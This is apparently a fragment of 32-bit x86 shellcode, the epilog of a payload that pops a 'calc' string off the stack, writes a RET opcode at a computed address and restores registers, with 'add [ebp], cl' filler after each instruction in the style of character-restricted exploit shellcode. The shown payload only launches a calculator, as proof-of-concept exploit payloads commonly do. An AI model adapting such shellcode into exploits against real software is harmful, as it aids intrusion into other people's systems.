    
    
    bits 32
    
    ; remove homespace
    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl
    
    ; load current address into ecx
    pop    ecx
    add    [ebp], cl
    
    ; add offset to ret_opcode
    mov    eax, 0xFF004d00
    add    cl, ah
    add    [ebp], cl
    
    ;mov    eax, 0xFF000100
    ;add    ch, ah
    ;add    [ebp], cl
    
    ; load offset into eax
    push   ecx
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    ; store RET opcode
    mov    byte[eax], 0xc3
    add    [ebp], cl
    
    ; remove 'calc\0'
    pop    ecx
    add    [ebp], cl
    
    ; ***************************** epilog
    ; restore ebx
    pop    ebx
    add    [ebp], cl
    
    ; restore esi
    pop    esi
    add    [ebp], cl
    
    ; restore edi
    pop    edi
    add    [ebp], cl
    
    ; remove var for ebp
    pop    ecx
    add    [ebp], cl
    
    ; return 0 
    push   0
    pop    eax
    add    [ebp], cl
    
    ; fixup the stack
    pop    esp
    add    [ebp], cl
    
    ; restore ebp
    pop    ebp
ret_opcode:
    ; return to caller
    